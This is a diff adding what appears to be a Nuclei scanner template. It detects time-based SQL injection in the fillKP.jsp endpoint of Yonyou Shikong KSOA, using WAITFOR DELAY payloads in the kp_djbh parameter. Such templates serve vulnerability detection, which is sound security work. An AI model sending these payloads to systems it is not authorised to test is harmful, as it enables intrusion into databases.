@@ -1,0 +1,31 @@
+id: yongyoushikong-KSOA-fillKP-sql
+
+info:
+  name: 用友时空KSOA fillKP.jsp接口存在SQL延时注入
+  author: HuanXiong
+  severity: high
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /kp/fillKP.jsp?kp_djbh=1';WAITFOR+DELAY+'0:0:3'-- HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /kp/fillKP.jsp?kp_djbh=1';WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=6 && duration_1<=7'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
+
+
+ 
+
+
+
+
